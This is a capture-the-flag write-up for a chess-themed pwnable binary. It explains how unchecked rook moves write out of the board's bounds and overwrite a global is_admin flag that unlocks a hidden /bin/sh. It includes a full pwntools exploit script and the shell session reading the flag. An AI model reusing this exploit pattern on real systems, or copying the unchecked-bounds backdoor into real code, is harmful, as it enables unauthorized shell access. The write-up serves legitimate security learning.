# chess Writeup

## Challenge infos

```text
Do you know how to play chess?
I sure do!
Challenge is running at: nc pwnable.co.il 9002
```

## Executable analysis
### checksec output
```text
        Arch:       amd64-64-little
        RELRO:      🟡 Partial RELRO
        Stack:      🔴 No canary found
        NX:         🟢 NX enabled
        PIE:        🔴 No PIE (0x400000)
        SHSTK:      🟢 Enabled
        IBT:        🟢 Enabled
        Stripped:   🔴 No
        Debuginfo:  🔴 Yes
```
* as we can see, the binary is not PIE, has no canary, and the NX bit is enabled.
* this means that we know the address of all symbols in the binary and can use ROP to execute code, but cannot run shellcode on the stack.
### code analysis
```c
int main(int argc, char* argv[]) {
    init_buffering();
    init_board();
    banner();
    int turn = WHITE;
    while (1) {
        print_board();
        char buf[6]; // max pgn chess move size
        memset(buf, 0, 6);
        scanf("%6s", buf);
		if (!strcmp(buf, "admin")) {
			if (is_admin) {
				system("/bin/sh");
			}
            continue;
		}
        getchar();
        chess_move* move = parse_move(buf, turn);
        do_move(board, *move);
        turn = 1 - turn;
    }
}
```
* the main function initializes the game, prints the board, and waits for user input.
* the user can enter a move in PGN format, which is a standard format for chess moves.
* if the user enters "admin", the program will check if the user is an admin and if so, it will execute a shell.

* let look where the `is_admin` variable is set:
```text
Showing symbols in chess...
   100: 0000000000401000     0 FUNC    GLOBAL HIDDEN    12 _init
    91: 0000000000401190    47 FUNC    GLOBAL DEFAULT   15 _start
    ...
    58: 00000000004050a9     1 OBJECT  GLOBAL DEFAULT   26 is_admin
    88: 00000000004050c0    64 OBJECT  GLOBAL DEFAULT   26 board
```
* the `is_admin` variable is a global variable that stored next to the `board` variable.
* that means that if we can overwrite the `is_admin` variable by overflowing the boad buffer, we can become an admin and execute a shell.

* we can see that when parsing a chess mov the program does not check if the move is out the bounds of the board, so we can overflow the buffer and overwrite the `is_admin` variable.
```c
uint8_t validate_rook_move(chess_move* out, uint8_t i, uint8_t j) {
    i = 7 - i;
    return j == out->file_dest || i == out->rank_dest;
}
```
```
 + + + + + + + + + + +
 + |r|n|b|q|k|b|n|r| + 
 + |p|p|p|p|p|p|p|p| + 
 + | | | | | | | | | + 
 + | | | | | | | | | + 
 + | | | | | | | | | + 
 + | | | | | | | | | + 
 + |P|P|P|P|P|P|P|P| + 
 + |R|N|B|Q|K|B|N|R| + 
 + + + + + + + + + + +
 ```
 * for example if we will mov the left black rook (`r`) 23 times to the left, we will overflow the buffer and overwrite the `is_admin` with the rook (setting it to true).


### Final exploit code
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chess
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chess')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('pwnable.co.il', 9002, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes

io = start()

is_admin = exe.sym['is_admin']
board = exe.sym['board']
distance = board - is_admin

# parsing a wihte move (no meaning, just to get the next prompt)
io.sendafter(b'+ +\n', b'Nc3\n')
# moving the rook to the is_admin address
io.sendafter(b'+ +\n', f'R{chr(ord('a') - distance)}8\n')
# getting shell access
io.sendafter(b'+ +\n', b'admin\n')
io.interactive()
```
* now, when we run the exploit, we should get a shell.
```
[+] Opening connection to pwnable.co.il on port 9002: Done
/home/omri/dev/pwn-writeups/il/chess/./exploit.py:56: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendafter(b'+ +\n', f'R{chr(ord('a') - distance)}8\n')
[*] Switching to interactive mode
 + |r|n|b|q|k|b|n|r| + 
 + |p|p|p|p|p|p|p|p| + 
 + | | | | | | | | | + 
 + | | | | | | | | | + 
 + | | | | | | | | | + 
 + | | |N| | | | | | + 
 + |P|P|P|P|P|P|P|P| + 
 + |R| |B|Q|K|B|N|R| + 
 + + + + + + + + + + +
 + + + + + + + + + + +
 + | |n|b|q|k|b|n|r| + 
 + |p|p|p|p|p|p|p|p| + 
 + | | | | | | | | | + 
 + | | | | | | | | | + 
 + | | | | | | | | | + 
 + | | |N| | | | | | + 
 + |P|P|P|P|P|P|P|P| + 
 + |R| |B|Q|K|B|N|R| + 
 + + + + + + + + + + +
$ ls
chess
flag
ynetd
$ cat flag
PWNIL{flag_is_here}
```